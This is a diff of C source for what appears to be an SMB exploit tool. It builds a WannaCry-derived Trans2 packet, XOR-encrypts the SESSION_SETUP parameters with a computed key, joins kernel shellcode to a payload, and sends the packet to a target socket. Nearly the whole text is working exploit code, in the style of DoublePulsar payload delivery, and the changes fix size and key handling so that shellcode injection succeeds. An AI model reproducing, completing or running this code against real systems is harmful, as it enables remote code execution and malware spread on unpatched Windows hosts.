@@ -289,13 +289,37 @@ int main(int argc, char* argv[])
 	//might need to make this static due to sizeof being garbage @ counting shellcode
 	unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
 	unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);
-	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size;
+	
+	//remove the NULL terminator count
+	kernel_shellcode_size -= 1;
+	payload_shellcode_size -= 1;
+
+	//add +2 to the entire shellcode size because the size of the shellcode MUST be appended to the total length
+	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;
 
 	//generate the SESSION_SETUP parameters here
-	unsigned int TotalSizeOfPayload = 4096 ^ XorKey;
-	unsigned int ChunkSize = 4096 ^ XorKey;
-	unsigned int OffsetofChunkinPayload = 0 ^ XorKey;
-	char Parametersbuffer[12];
+	unsigned int TotalSizeOfPayload = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int ChunkSize = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int OffsetofChunkinPayload = 0x0000;
+	unsigned char Parametersbuffer[13];
+	memset(Parametersbuffer, 0x00, 13);
+	memcpy((unsigned char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
+	memcpy((unsigned char*)Parametersbuffer + 4, (char*)&ChunkSize, 4);
+	memcpy((unsigned char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
+
+	//convert the calculated XOR key from unsigned int to unsigned char
+	unsigned char char_xor_key[5];
+	char_xor_key[0] = (unsigned char)XorKey;
+	char_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
+	char_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
+	char_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
+
+	//Encrypting signature buffer
+	int i;
+	for (i = 0; i < 13; i++)
+	{
+		Parametersbuffer[i] ^= char_xor_key[i % 4];
+	}
 
 	//allocate memory for encrypted shellcode payload buffer
 	unsigned char* encrypted;
@@ -342,11 +366,6 @@ int main(int argc, char* argv[])
 	//copy wannacry skeleton packet to big Trans2 packet
 	memcpy((unsigned char*)big_packet, (unsigned char*)&wannacry_Trans2_Request, 70);
 
-	//copy XOR values to parameters buffer
-	memcpy((char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
-	memcpy((char*)Parametersbuffer + 4, (char*)&ChunkSize, 4);
-	memcpy((char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
-
 	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 	memcpy((unsigned char*)big_packet + 70, (unsigned char*)&Parametersbuffer, 12);
 
@@ -356,6 +375,28 @@ int main(int argc, char* argv[])
 	//Update treeID, UserID
 	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
 	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+	
+	/* for future use 
+	
+	//update key values in the packet
+	unsigned short smb_length = 4096+70+12;
+	printf("SMB Length:  %hu\n", smb_length);
+	memcpy((unsigned char*)big_packet + 2, (char*)&smb_length, 2);
+
+	//maybe uint16_t ??
+	unsigned short TotalDataCount = 4096;
+	unsigned short DataCount = 4096;
+	unsigned short byteCount = 4096 + 13;
+
+	*(WORD*)(big_packet + 0x27) = TotalDataCount;
+	*(WORD*)(big_packet + 0x3b) = DataCount;
+	*(WORD*)(big_packet + 0x45) = byteCount;
+
+	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x45, (char*)&byteCount, 2);
+	
+	*/
 
 	//send the payload
 	send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
